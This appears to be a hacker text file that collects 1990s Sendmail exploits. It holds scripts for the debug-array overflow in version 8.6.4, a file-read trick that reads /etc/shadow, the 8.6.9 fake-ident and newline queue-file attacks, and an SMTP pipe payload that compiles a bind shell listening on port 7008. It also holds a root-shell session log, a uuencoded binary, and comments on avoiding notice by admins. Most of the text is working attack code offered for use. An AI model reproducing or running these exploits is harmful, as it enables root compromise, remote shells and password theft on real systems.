            "(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,",
            "1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if",
            "(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto",
            "loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()",
            "==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<",
            "NSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2",
            "(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);",
            "goto loop;}",
            "echo \"EOF\"",
            "echo \"cd /tmp\"",
            "echo \"/bin/cc /tmp/a.c\"",
            "echo \"/bin/rm a.c\"",
            "echo \"/tmp/a.out $port $cmd\"",
            "echo \".\"",
            "echo \"quit\"",
            ") | mconnect $1",
            "Or you can also ul this to port 25.",
            "BTW, it gets you in by running a program that listens to port 7008...",
            "you telnet to port 7008. You can then proceed to create new users in",
            "/etc/passwd because you own the /etc dir...you need to type a ; after every",
            "command, and it gives you 1 error every command...ignore it. The process",
            "may be noticed by a few admins.",
            "helo",
            "mail from: |",
            "rcpt to: bounce",
            "data",
            "mail from: bin",
            "rcpt to: | sed '1,/^$/d' | sh",
            "data",
            "cat > /tmp/a.c <<EOF",
            "#include <sys/types.h>",
            "#include <sys/signal.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netdb.h>",
            "reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;",
            "int **av;{struct sockaddr_in mya;struct servent *sp",
            ";fd_set muf;int myfd,new,x,maxfd=getdtablesize();",
            "signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,",
            "0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,",
            "sizeof(mya.sin_addr));if((sp=getservbyname(av[1],\"tcp\"))",
            "==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port",
            "=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,",
            "(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,",
            "1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if",
            "(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto",
            "loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()",
            "==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<",
            "NSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2",
            "(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);",
            "goto loop;}",
            "cd /tmp",
            "/bin/cc /tmp/a.c",
            "/bin/rm a.c",
            "/tmp/a.out 7008 /bin/sh",
            "quit",
            "............................... CuT HeRe ..................................",
            "= -d########### =     *TeSTeD oN SunOS & SunOS with Sendmail8.6.4*  ",
            "This bug is present in all 8.X.X sendmail versions prior to 8.6.7",
            "Here follow excerpts from Michael Widner's message on Bugtraq with ",
            "his script for SunOs and Solaris, and another script tested on SunOS 5.2",
            "with sendmail 8.6.4:",
            "\"The important thing to know is that if your sendmail crashes when you ",
            "pass it something like -d387654321 then it can most likely be exploited to ",
            "gain root access.",
            "Without going into much detail, -dx.y writes y into the debug array as",
            "array[x]=y.  Range checking is not performed properly on x, so it's possible",
            "to pass negative integers that pass the range check.  Find a key location",
            "before the debug array, over write it, and you're in business.",
            "The problem in trying to create a generic script is that the 'key' locations",
            "have different offsets from the debug array for every version of sendmail.",
            "Sometimes they're easy to locate if you can get a core, but sometimes it is",
            "tough to get a core w/o already being root.  Also, sometimes a core tells",
            "you nothing.",
            "The following script is Sun specific, and patches are now available for",
            "all versions of Sun sendmail.  The script creates a suid root owned copy",
            "of /bin/sh and places it in /tmp.  If you're hacking solaris, I'd suggest",
            "you choose some program other than /bin/sh. \"",
            "#!/bin/sh",
            "# This script takes advantage of sendmail's (mis)interpretation of",
            "# very large unsigned ints as signed ints when accessing the debug",
            "# array.  As it, it will work with the 8 versions of sun sendmail",
            "# that I have access to.  Perhaps I'll update it if I find new",
            "# versions of sun sendmail.",
            "# NOTE:  This is a Sun specific script.  Don't expect it to work with",
            "#        any non-sun sendmail.",
            "# -Michael R. Widner (atreus)        3/25/94",
            "# usage:  smdhole [/path/to/suid/sendmail]",
            "# add /usr/ucb to path so solaris can find `whoami` (4/18/94)",
            "path=$path:/usr/ucb",
            "if [ $1x = x ]; then",
            "        sendmail=/usr/lib/sendmail",
            "else",
            "        echo \"Trying to abuse $1.\"",
            "        sendmail=$1",
            "sm_size=`echo \\`ls -l $sendmail\\` | cut -d\" \" -f4,5 | sed \"s/[^0-9]//g`",
            "# prefix and suffix for -1 as unsigned integer.  Actually, this is",
            "# off by two.  you figure out why.",
            "prefix=42949",
            "suffix=67297",
            "case $sm_size in",
            "        132064)",
            "                n1=${prefix}52864",
            "                n2=${prefix}52865",
            "                n3=${prefix}52866",
            "                echo Patched solaris w/o mx.",
            "                ;;",
            "        134752) # ug! dropped a 0 before.  fixed 4/18/94",
            "                n1=${prefix}01656",
            "                n2=${prefix}01657",
            "                n3=${prefix}01658",
            "                echo Patched solaris sendmail.mx",
            "                ;;",
            "        130860)",
            "                n1=${prefix}53016",
            "                n2=${prefix}53017",
            "                n3=${prefix}53018",
            "                echo Un-patched solaris w/o mx.",
            "                ;;",
            "        133548) # ug! dropped a 0 before.  fixed 4/18/94",
            "                n1=${prefix}01808",
            "                n2=${prefix}01809",
            "                n3=${prefix}01810",
            "                echo Un-patched solaris sendmail.mx",
            "                ;;",
            "        139264)",
            "                n1=${prefix}49609",
            "                n2=${prefix}49610",
            "                n3=${prefix}49611",
            "                echo Sun 4.1.3 sendmail - could be either of two versions",
            "                n4=${prefix}49265",
            "                n5=${prefix}49266",
            "                n6=${prefix}49267",
            "                ;;",
            "        155648)",
            "                n1=${prefix}46953",
            "                n2=${prefix}46954",
            "                n3=${prefix}46955",
            "                echo Sun 4.1.3 sendmail.mx - could be either of two versions",
            "                n4=${prefix}46609",
            "                n5=${prefix}46610",
            "                n6=${prefix}46611",
            "                ;;",
            "        *)",
            "                echo \"I don't know what version of sendmail $sendmail is.\"",
            "                echo -n \"Look for other versions of sendmail[.mx] on the \"",
            "                echo \"system and re-run this as:\"",
            "                echo \"     $0 /path/to/another/suid/sendmail\"",
            "                echo",
            "                echo \"Let me see if I can suggest anything...\"",
            "                find /usr/lib /var/sadm/patch -name \"*sendm*\" -perm -4001 ",
            "-ls 2>/dev/null",
            "                exit 1",
            "                ;;",
            "        esac",
            "cat << EOM > /tmp/sendmail.cf",
            "DMether",
            "DRlocalhost",
            "CRlocalhost",
            "CDMailer-Daemon root daemon uucp",
            "DlFrom \\$g  \\$d",
            "Do.:%@!^=/[]",
            "Dq\\$g\\$?x (\\$x)\\$.",
            "De\\$j nothing",
            "OA./aliases",
            "OF0666",
            "OPPostmaster",
            "T root daemon uucp",
            "H?F?From: nobody",
            "Mlocal, P=/tmp/in.telnet, F=flsSDFMmnP, S=10, R=20, A=mail -d \\$u",
            "Mprog,  P=/tmp/in.telnet,   F=lsDFMeuP,  S=10, R=20, A=sh -c \\$u",
            "R\\$+                    \\$#local \\$:\\$1                 just rewrite",
            "cat $0 | sed \"s:atreus::\" | uudecode",
            "uncompress /tmp/in.telnet.Z",
            "chmod 755 /tmp/in.telnet",
            "mkdir /tmp/mail",
            "cp /tmp/sendmail.cf /tmp/mail",
            "cp /bin/sh /tmp/newsh",
            "chmod 666 /tmp/newsh",
            "$sendmail -d${n1}.116,${n2}.109,${n3}.112 `whoami`  <<EOF",
            "test",
            "if [ -x /tmp/newsh ]; then",
            "        echo \"Had the right offset for sendmail.cf.  Here's the result:\"",
            "else",
            "        echo \"Looks like I had the wrong sendmail.cf offset.  Fuckers.\"",
            "        if [ ${n4}x = x ]; then",
            "                echo \"This version isn't what I thought it was.\"",
            "                echo \"Look for other suid sendmails and try this on them.\"",
            "        else",
            "                echo \"I'm taking another stab with a different offset.\"",
            "$sendmail -d${n4}.116,${n5}.109,${n6}.112 `whoami` <<EOF",
            "test",
            "                echo \"Here's the result:\"",
            "        fi",
            "rm /tmp/in.telnet",
            "rm -r /tmp/mail",
            "rm /tmp/sendmail.cf",
            "ls -l /tmp/newsh",
            "exit",
            "# I'm calling this in.telnet for one reason.  It shows up in the acct logs",
            "# as being run by root.  It will attract less attention if it's something",
            "# normally run by root.  An alert admin will catch is anyway, because",
            "# in.telnet is normally not associated with a tty.  The obvious fix, if you",
            "# want to go undetected, would be to modify the acct files once you've",
            "# become root.",
            "begin 775 /tmp/in.telnet.Z",
            "M'YV0@08$6    (B\"!A$J5 CBX,*\"O\" <A#8 %!!)%8E44@%\" \"4!H A\\!*+@atreus",
            "M0D$(U$2  S:@( )A ,0@  0)0  !@  0\"( 02$$%/ OZ1+\"S9T%'G$:  C%4atreus",
            "MH%&B00%T&O<+S0N7KBJ(0Q'!)20)(ACX!+!$DD0 K\"  0( 1%)>Q2RA)! %(atreus",
            "M5$,).9]$%38!E!= H,(LP$LV*KJ*8(15)\".N(AI2!6Q*(@ HPM6U6<4A@716atreus",
            "M+H@\"%QQ:D@!. \":U%L;2T'36E%H$D 0 H\"!ML><#H0N.!B?A-(#4!5>PGGT9atreus",
            "M068Z7==^%;%A[ BS!U6]5@P*#4V;. $L*)YY,P%@$LP\"B' [-X#=O=56&'N!atreus",
            "M]4'J<$(\"\"V!.*1]U2@&Q4TJHY5J8,@FC%\"+^00 3&, (\" HC_B$@\" 1@D*$@atreus",
            "M))R!$, GQ!0$'1^!' ,. H&@<U).!CSX&00Y$6#B$2@\"((\") T0\"S4$*I!A5atreus",
            "M(,-\\&%6% DA2 #@$4%, , \"82(\",!U7XAXD!(&G4\"W7,(<<+;*0A!I5DN##'atreus",
            "M&P\"\\0$89=KR@1QER</E0!F/(00<,.H#@QAL@0\"DEE59BJ>4;\"CP$@ EIKMFFatreus",
            "MG%-6>24;66X)0AMAP %'&FZ< 8(98:3!1AURE)'G0A3TR::;<'H)IIADXKG0atreus",
            "M\"W2T <<+;I1QQQQH%#35+Y\",%40(+OET@!X5 @ )!2)  AT MN;AF:Z\\Q@K atreus",
            "M 7F8E4([MJZ1:X<?AOC0JY DAY( ((!3UR__$-: )!)D\"XT 8%!FEXLY)3\"Latreus",
            "M)>02\\*LD[8X+Q )U'20!M_U\\!$H DDB24W8*6\"M*N.\"$H@(8 D!#P'B?P&03atreus",
            "M0J 0\\@,_,N\"K\\'C0@BBB5%15>Y(TV')3%QCH I  *.%R<S$ #1<4$@@$K%POatreus",
            "M /?^LT]4R<$&%CBV(O%KQM)R#.L$)XT+!C,S$T9 A0'\\\\<\\_YT CPM% ;_P0atreus",
            "M$&P41( E3_^3(;!X%)0 UT_3(A0A!15 ]C^L\"%43  VLO3$0G!2TP-K8\"(7*atreus",
            "M3VLS(Y39 #BP-A,(^0>  0BI51#1!36 $ 4(1>7X0Y$5)%M!!R\"TL$L(50[ atreus",
            "MI8<CE !\"F1?D $((($20V @Q@!#HBFN'T .M(Y1<X'K2_M#M$B#4^T.,8ZHGatreus",
            "M )$=P$A!)R!!>N8&A\"-4WJ:/7H#?P%H]060%G&Z00P!DP-, 8NA9 D\\&B*,Gatreus",
            "M\"Y$-X$=!(M1=D R9%R\"'4$06M$/F!^0@E$)%? ^*GDO@R0% IQ I\") %>LI\"atreus",
            "M9 A@BH*,@!0(\"0-/B**G-)\"/#GJ20^9,(Q1H((00HSM ')Z'D$F,3@#3$ HXatreus",
            "M$\"**R!@@#P[$ D)JX<)$L&^%!4%&_/X'+&1\\H0QT* ,>,/A#,H2!#F$ P _=atreus",
            "M0 8 S &):G(B%.GP!3.PX0U'5.(/\\9 &(B**44HL@QOLD(8RN4&+1,B\"$X+0atreus",
            "MA\"0,(8Q<).(8T-\"&-S3Q\"W-\\PQW.^(4^?I&/<P!B'=)PQS>X88M=U*(0N_@%atreus",
            "M,M2A#6W(0R/+,(:L]?$+0Z#\"$Z3P!28D80I4Z*,6OT $37+2DZ 4Y27)\\(8Oatreus",
            "MG.&*8@@#&_!(AS?(80ZC9*4K82G+1M;REHJ,8R,?&<DO5,H,PWM!&<I ACG8atreus",
            "M84ID2,,<UC #*KUA#+*DTY7.,(8QM$!0+Y@#',(@!V_.H0YN:,$YWS0'&K@@atreus",
            "M!BZHI@Q<4(-XZD\"9S'0F-*5)36MBDPW:'-X!Z**0\"6).<0<004XB]Y Q ( ,atreus",
            "M61N>1\"=*T8I:]*(8S:A&-\\K1CGKTHR -J4A'2M*2FO2D*$VI2E?*TI:Z]*4Patreus",
            "MC:E,9TK3FMKTICC-J4YWRM.>^O2G0 VJ4(=*U*(:]:A(3:I2E\\K4ICKUJ5\"-atreus",
            "MJE2G2M6J6O6J6,VJ5K?*U:YZ]:M@#:M8QTK6LIKUK&A-JUK7RM:VNO6M<(VKatreus",
            "M7.=*U[K:]:YXS>M2_0,$UP&+!\"<MW>'V!BPN\"(5D !B !W4\"6)U0;R&5*P Ratreus",
            "M$()#[@$ L3XQ7\"\" 0;*HO H43OL'/SQ+%= ^+1]!\"<!G0VN/H A@M4^;1U &atreus",
            "M -M_P\",H!*AM.X)2@-JJ(RB(DR@0%JO7XAKWN,A-KG*7R]SF.O>YT(VN=*=+atreus",
            "MW>I:][K8S:YVM\\O=[GKWN^ -KWC'2][RFO>\\Z$VO>M?+WO:Z][WPC:]\\YTO?atreus",
            "+^MKWOOC-KW[WFUS=atreus",
            " atreus",
            "endatreus",
            "----------------------- CuT HeRe -------------------------------------",
            "Here it is the other script:",
            "       ",
            "/* What follows is a sample run exercising the latest sendmail hole and the",
            "script used to exploit this hole.  This is a re-send; I neglected",
            "to escape the \".\" in the sendmail script, leaving the program",
            "slightly truncated.  To fix this, I have escaped the . so prior",
            "to executing this you must remove the \\.  (does that make any sense? :-)",
            "There was also a small problem with nested quotes pointed out by Peter",
            "Wemm which I have fixed.",
            "This is the \"small version\" of the script; it assumes you have a sane",
            "sendmail.cf.  In this manner, it is not a particularly robust \"breakin",
            "script\" but I believe it does illustrate how to exploit the bug.",
            "This program uses \"calc.c,\" the program mentioned by Timothy Newsham in",
            "an earlier message.  The program has been modified slightly so that it",
            "gives better results (it would occasionally fail to locate the offset of",
            "a config given a buggy sendmail.  The fix is to force a sync() after",
            "it generates a coredump.)  The remainder of the program was written",
            "by myself and a fellow student, Steven Dake.",
            "We have held off on releasing this script until we were able to notify",
            "the people responsible for system security at NAU.  Locals subscribing",
            "to this digest beware; sendmail on our machines has been patched! :-) */",
            "Script started on Thu Mar 24 00:54:54 1994",
            "[pine] [1] date",
            "Thu Mar 24 00:54:57 MST 1994",
            "[pine] [2] whoami",
            "[pine] [3] id",
            "uid=4473(jwa) gid=400(student)",
            "[pine] [4] ls -l sendbug.sh",
            "-rwx------   1 jwa      student     4893 Mar 24 00:46 sendbug.sh*",
            "[pine] [5] sendbug.sh",
            "Creating setid0 ...",
            "Creating calc...",
            "Scanning core image for /nau/local/lib/mail/sendmail.cf...",
            "Creating alias.sh ...",
            "Creating fake alias file...",
            "Faking alias pointer in new config file...",
            "Creating the sendmail script...",
            "Executing /usr/lib/sendmail -",
            "d4294935548.47,4294935549.116,4294935550.109,4294935551.112,4294935552.47,4294935553.115,429",
            "4935554.109,4294935555.46,4294935556.9",
            "Version 8.6.4",
            "220-pine.cse.nau.edu Sendmail 8.6.4/WHOOP-v1.0 ready at Thu, 24 Mar 1994 ",
            "00:55:21 -0700",
            "220 ESMTP spoken here",
            "250 pine.cse.nau.edu Hello jwa@localhost, pleased to meet you",
            "250 <nobody>... Sender ok",
            "250 <yash>... Recipient ok",
            "354 Enter mail, end with \".\" on a line by itself",
            "250 AAA01803 Message accepted for delivery",
            "503 Need MAIL before RCPT",
            "503 Need MAIL command",
            "500 Command unrecognized",
            "500 Command unrecognized",
            "221 pine.cse.nau.edu closing connection",
            "setid0 is a suid shell.  executing...",
            "executing /bin/csh...",
            "pine# whoami",
            "root",
            "pine# id",
            "uid=0(root) gid=0(root)",
            "pine# exit",
            "pine# end of script.",
            ". and here's the program.",
            "#!/bin/sh",
            "# exploit new sendmail bug to give us a root shell",
            "# 24 mar 94  jwa/scd @nau.edu",
            "# \"short version\"",
            "# tested on sunos 5.2/sendmail 8.6.4",
            "# location of sendmail",
            "SENDMAIL=/usr/lib/sendmail",
            "# location of original sendmail.cf file",
            "CONFIG=/nau/local/lib/mail/sendmail.cf",
            "#CONFIG=`strings $SENDMAIL | grep sendmail.cf`",
            "# program to execute as root",
            "SHELL=/bin/csh",
            "TEMPDIR=/tmp/sendbug-tmp.$$",
            "mkdir $TEMPDIR",
            "chmod 700 $TEMPDIR",
            "cd $TEMPDIR",
            "cp $SENDMAIL sm",
            "chmod 700 sm",
            "echo \"Creating setid0 ...\"",
            "cat > setid.c << _EOF_",
            "/* set uid to zero, thus escaping the annoying csh and solaris sh",
            " * problem..",
            " * if (getuid() != geteuid()) {",
            " *  printf(\"permission denied, you root-hacker you.\\n\");",
            " *  exit(1);",
            " * }",
            " * .. must be run euid 0, obviously.  with no args it runs /bin/sh,",
            " * otherwise it runs the 1st arg.",
            "#include <stdio.h>",
            "main(argc, argv)",
            "int argc;",
            "char *argv[];",
            " int uid;",
            " setuid(0);",
            " setgid(0);",
            " seteuid(0);  /* probabally redundant. */",
            " setegid(0);",
            " uid = getuid();",
            " if (uid != 0) {",
            "  printf(\"setuid(0); failed!  aborting..\\n\");",
            "  exit(1);",
            " if (argc !=2) {",
            "  printf(\"executing /bin/sh...\\n\");",
            "  system(\"/bin/sh\");",
            "  else",
            "  printf(\"executing %s...\\n\", argv[1]);",
            "  system(argv[1]);",
            "_EOF_",
            "cc -o setid0 setid.c",
            "echo \"Creating calc...\"",
            "cat > calc.c << _EOF_",
            " * Determines offset in sendmail of",
            " * sendmail.cf file location.",
            " * author: timothy newsham",
            "#include <fcntl.h>",
            "gencore()",
            "  int pid;",
            "  int fd[2];",
            "  if(pipe(fd) < 0) {",
            "    perror(\"pipe\");",
            "    exit(1);",
            "    return(0);",
            "  pid = fork();",
            "  if(!pid) {",
            "    int f = open(\"./out\", O_RDWR|O_CREAT, 0666);",
            "    dup2(f, 1); dup2(fd[0], 0);",
            "    close(f); close(fd[1]); close(fd[0]);",
            "    execl(\"./sm\",\"sm\",\"-d0-9.90\",\"-oQ.\",\"-bs\", 0);",
            "    perror(\"exec\");",
            "    exit(0);",
            "  } else {",
            "    sleep(2);",
            "    kill(pid, 11);",
            "  close(fd[0]);",
            "  close(fd[1]);",
            "main(argc,argv)",
            "char **argv;",
            "int argc;",
            "  unsigned int ConfFile,tTdvect,off;",
            "  gencore();",
            "  sync();   /* grr. */",
            "  tTdvect = find(\"ZZZZZZZZ\", \"core\");",
            "  ConfFile = find(argv[1], \"core\");",
            "  if(!tTdvect || !ConfFile) {",
            "   return(1);",
            "  off = ConfFile - tTdvect;",
            "printf(\"-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\\n\",  off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \\",
            "  off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10);",
            "int find(pattern, file)",
            "char *pattern,*file;",
            "  int fd;",
            "  int i, addr;",
            "  char c;",
            "  fd = open(file, 0);",
            "  i = 0;",
            "  addr = 0;",
            "  while(read(fd, &c, 1) == 1) {",
            "    if(pattern[i] == c)",
            "      i++;",
            "    else",
            "      i=0;",
            "    if(pattern[i] == '\\0') {",
            "      addr -= strlen(pattern);",
            "      return(addr);",
            "    }",
            "    addr++;",
            "  return(0);",
            "_EOF_",
            "cc calc.c -o calc",
            "echo \"Scanning core image for $CONFIG...\"",
            "DEBUGFLAGS=`calc $CONFIG`",
            "echo \"Creating alias.sh ...\"",
            "echo \"#!/bin/sh",
            "# this program will be executed when mail is sent to the fake alias.",
            "# since solaris sh and csh and tcsh refuse to run when euid != realuid,",
            "# we instead run the program we compiled above.",
            "/bin/chmod 6777 $TEMPDIR/setid0",
            "/bin/chown root $TEMPDIR/setid0",
            "/bin/sync",
            "\" > alias.sh",
            "chmod 755 alias.sh",
            "echo \"Creating fake alias file...\"",
            "echo \"yash: |$TEMPDIR/alias.sh\" > aliases",
            "echo \"Faking alias pointer in new config file...\"",
            "egrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf",
            "echo \"",
            "# hacks follow",
            "OA/$TEMPDIR/aliases                     # our fake alias file",
            "Ou0                                     # user ID to run as",
            "Og0                                     # group ID to run as",
            "DZWHOOP-v1.0\" >> /tmp/sm.cf",
            "echo \"Creating the sendmail script...\"",
            "cat > sendmail.script << _EOF_",
            "helo",
            "mail from: <nobody>",
            "rcpt to: <yash>",
            "data",
            "yet another sendmail hole?  suid whoop?",
            "\\.                                      # oops.. delete \\ prior to execution",
            "quit",
            "_EOF_",
            "echo \"Executing $SENDMAIL $DEBUGFLAGS -bs...\"",
            "$SENDMAIL $DEBUGFLAGS -bs < sendmail.script",
            "# give it time to execute.",
            "sleep 4",
            "# cleanup in 5 seconds",
            "(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &",
            "if [ -u setid0 ]",
            "then",
            " echo \"setid0 is a suid shell.  executing...\"",
            " cd /",
            " $TEMPDIR/setid0 /bin/csh",
            " echo \"end of script.\"",
            " exit 0",
            "else",
            " echo \"setid0 is not suid; script failed.\"",
            " echo \"apparently, you don't have the bug.  celebrate :-)\"",
            " exit 1",
            "--------------------------------- CuT HeRe --------------------------------",
            "= -oE/filename bounce =               *8.6.7* ",
            "Version affected: 8.6.7",
            "A bug in Sendmail 8.6.7 allows anyone to read any file,",
            "including the shadowed password file:",
            "/usr/lib/sendmail -oE/etc/shadow bounce",
            "From: your_username",
            "= 8.6.9 =                      *8.6.9 or earlier* ",
            "Mail any file to yourself.  ",
            "------8<-------------------Cut Here--------------------8<-------------------",
            "# This is a shell archive.  Save it in a file, remove anything before",
            "# this line, and then unpack it by entering \"sh file\".  Note, it may",
            "# create directories; files and directories will be owned by you and",
            "# have default permissions.",
            "# This archive contains:",
            "#       description",
            "#       sm869.local",
            "#       sm869.remote",
            "echo x - description",
            "sed 's/^X//' >description << 'END-of-description'",
            "XProgram: sm869.remote",
            "Xyou can:",
            "X   run the body of the mail through a shell if",
            "X   sendmail is allowed to run a shell.",
            "X   write the whole message to a file.",
            "X   have it send back a file to an account you specify.",
            "XThe last option is supposed to remove the file after sending",
            "Xit but I found that it hasn't in my tests.  Why?  Well",
            "Xit has multiple recipients, one of the recipients is a",
            "Xrecipient that will never go through.  So the data file",
            "Xgets kept around until it gives up on that host.  This",
            "Xcan be several days.",
            "XProblems:",
            "X  The action you specify will happen every 30minutes (the",
            "X  queue time, may be different) until it gives up sending",
            "X  to the unreachable host.  (Actually this may be false.",
            "X  I haven't left it around long enough to see if this happens.",
            "X  Perhaps sendmail is smart enough to remove the other recipients",
            "X  that did get delievered from the queue file).",
            "X  If you send a file back to yourself it may get removed",
            "X  several days later.  If you get the password file or",
            "X  some other critical file you had better be ready to clean",
            "X  up.",
            "X  Lots of logs.  Its fairly obvious from the log files that",
            "X  some hokey pokey is going on.  If you're sending a file",
            "X  back to yourself then you're pointing a finger at one",
            "X  of your accounts",
            "XYou have to go into the program to change the options you",
            "Xwant.  The code is fairly well commented so this shouldn't",
            "Xbe any problem.",
            "XProgram: sm869.local",
            "XSame thing as above really except it works even if sendmail",
            "Xdoesnt check identd and you dont have to specify an unreachable",
            "Xhost.  The file goes straight to the queue.",
            "END-of-description",
            "echo x - sm869.local",
            "sed 's/^X//' >sm869.local << 'END-of-sm869.local'",
            "X#!/bin/sh",
            "X# Exploit hole in sendmail 8.6.9 and earlier.",
            "X# Either write a file or run a program.",
            "X#ACTION=\"|/tmp/runme\"",
            "XACTION=\"/tmp/writeme\"",
            "X# Data file to read from and then remove",
            "XDATAFILE=\"/tmp/abc\"",
            "X#DATAFILE=\"\"",
            "X# Who to run as",
            "XRUNAS=\"bin\"",
            "X# Who to send mail to",
            "XWHOAMI=`whoami`",
            "XSENDTO=$WHOAMI",
            "X#SENDTO=\"someone-else\"",
            "X# Build up arg and send it off",
            "Xif [ -n \"$DATAFILE\" ] ; then",
            "XARG=\"$WHOAMI",
            "XD$DATAFILE",
            "XC:$RUNAS",
            "XR\\\"$ACTION\\\"\"",
            "Xelse",
            "XARG=\"$WHOAMI",
            "XC:$RUNAS",
            "XR\\\"$ACTION\\\"\"",
            "Xsendmail -odq -F\"$ARG\" $SENDTO << _END_",
            "XThis is appearing in the mailbox",
            "Xand also being piped to the program or",
            "Xwritten to the file, UNLESS you specify",
            "Xa datafile above.  In that case the datafile",
            "Xwill be written and erased and this text will",
            "Xbe left (not deleted) in the queue directory.",
            "X_END_",
            "END-of-sm869.local",
            "echo x - sm869.remote",
            "sed 's/^X//' >sm869.remote << 'END-of-sm869.remote'",
            "X#!/bin/sh",
            "X# exploit for sm869 or worse",
            "X# identd must not be enabled (port 113 must be free)",
            "X# this must be a host that mail can go to (MX not pointing elsewhere)",
            "X# that we cant reach right now (ie. host doesnt exist anymore)",
            "XUNREACHABLE=\"goofy.uhcc.hawaii.edu\"",
            "X# Commands to run on remote host",
            "XCOMMANDS=\"touch /tmp/gotcha\"",
            "X# what host to run it on",
            "XTARGET=\"localhost\"",
            "X# work in a temp dir",
            "XTD=/tmp/.Xwork.$$",
            "Xmkdir $TD",
            "Xcd $TD",
            "Xcat > a.c <<_END_",
            "X#include <sys/types.h>",
            "X#include <sys/socket.h>",
            "X#include <netinet/in.h>",
            "X/* run body of mail through shell run as daemon */",
            "X#define REPLY \"USERID : UNIX : a\\nC:daemon\\nR\\\"|sed ",
            "'1,/^$/d'|/bin/sh\\\"\\nHXxx:",
            "X#ifdef other_possibilities",
            "X/* write to a file as daemon */",
            "X#define REPLY \"USERID : UNIX : a\\nC:daemon\\nR/tmp/writeme\\nHXxx: \"",
            "X/* send back a file to someone and erase it */",
            "X#define REPLY \"USERID : UNIX : ",
            "a\\nD/tmp/sendtome\\nRmy@address.here\\nHXxx: \"",
            "X#endif",
            "Xreadline(fd, buf, len)",
            "Xchar *buf;",
            "X    int i = 0;",
            "X    while(i < len && read(fd, &buf[i], 1) == 1 && buf[i]) {",
            "X       if(buf[i] == '\\r' || buf[i] == '\\n')",
            "X           break;",
            "X       i++;",
            "X    }",
            "X    buf[i] = '\\0';",
            "Xdie(str)",
            "Xchar *str;",
            "X    perror(str); exit(1);",
            "Xmain()",
            "X    int s, s2, adlen;",
            "X    struct sockaddr_in ad;",
            "X    char buf[60];",
            "X    ad.sin_family = AF_INET;",
            "X    ad.sin_port = htons(113);",
            "X    ad.sin_addr.s_addr = INADDR_ANY;",
            "X    if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) die(\"socket\");",
            "X    if(bind(s, (struct sockaddr *)&ad, sizeof(ad)) == -1) die(\"bind\");",
            "X    if(listen(s, 1) == -1) die(\"listen\");",
            "X    adlen = sizeof(ad);",
            "X    s2 = accept(s, (struct sockaddr *)&ad, &adlen);",
            "X    if(s2 == -1) die(\"accept\");",
            "X    printf(\"Connection from %s port %d\\n\",",
            "X        inet_ntoa(ad.sin_addr), ntohs(ad.sin_port));",
            "X    readline(s2, buf, 50);",
            "X    sprintf(buf + strlen(buf), \" : %s\\n\", REPLY);",
            "X    write(s2, buf, strlen(buf));",
            "X_END_",
            "X# compile program",
            "Xecho \"compiling\"",
            "Xcc a.c -o ident",
            "Xecho \"running fake ident\"",
            "X./ident &",
            "X# send to reomte",
            "Xecho \"talking to remote\"",
            "X  sleep 1; echo \"helo\"",
            "X  sleep 1; echo \"mail from: <dan>\"",
            "X  sleep 1; echo \"rcpt to: <bounce@$UNREACHABLE>\"",
            "X  sleep 1; echo \"data\"",
            "X  echo \"$COMMANDS\"",
            "X  echo \".\"",
            "X  sleep 1; echo \"quit\"",
            "X  sleep 5",
            "X) | telnet $TARGET 25",
            "X# cleanup",
            "Xcd /",
            "Xrm -rf $TD",
            "Xecho \"done.\"",
            "END-of-sm869.remote",
            "exit",
            ".................................. CuT HeRe ..................................",
            "= 8.6.9 newlines =               *8.6.9*",
            "When a message is queued for delivery by sendmail, a pair of files are",
            "written to the spool directory (/var/spool/mqueue on many systems).",
            "One of these files (qf<something>) contains information related to the",
            "processing of the message (headers, sender, recipient, etc.).  Taking",
            "versions of sendmail prior to 8.6.10 as an example, one of the pieces",
            "of information maintained in this file is the name of the controlling",
            "user if mail is being delivered to a script (or file).  By feeding",
            "sendmail a recipient address that contains newlines, it is possible to",
            "add lines to the queue file which specify a controlling user and an",
            "executable to run with that users access level.  The 8.6.10 patch",
            "removes this hole, by stripping newlines from the recipient address",
            "before writing the queue file.",
            "EXPLOIT:",
            "/* smh.c - Michael R. Widner - atreus (2/27/95)",
            " * <widner@uchicago.edu> <atreus@primus.com>",
            " * a quick hack to abuse sendmail 8.6.9 or whatever else is subject to this",
            " * hole.  It's really just a matter of passing newlines in arguments to",
            " * sendmail and getting the stuff into the queue files.  If we run this",
            " * locally with -odq we are guaranteed that it will be queue, rather than",
            " * processed immediately.  Wait for the queue to get processed automatically",
            " * or just run sendmail -q if you're impatient.",
            " * usage: smh [ username [/path/to/sendmail]]",
            " * It's worth noting that this is generally only good for getting bin.",
            " * sendmail still wants to process the sendmail.cf file, which contains",
            " * Ou1 and Og1 most of the time, limiting you to bin access.  Is there",
            " * a way around this?",
            " * cc -o smh smh.c should do the trick.  This just creates a bin owned",
            " * mode 6777 copy of /bin/sh in /tmp called /tmp/newsh.  Note that on some",
            " * systems this is pretty much worthless, but you're smart enough to know",
            " * which systems those are.  Aren't you?",
